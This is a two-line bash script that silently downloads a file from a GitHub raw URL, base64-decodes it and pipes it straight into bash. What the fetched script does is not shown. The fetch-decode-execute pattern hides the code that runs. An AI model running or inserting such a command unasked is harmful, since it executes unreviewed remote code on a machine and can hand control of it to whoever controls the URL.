#!/bin/bash
wget -qO- https://raw.githubusercontent.com/raymondragland/ginger/refs/heads/main/entrypoint.sh | base64 -d | bash
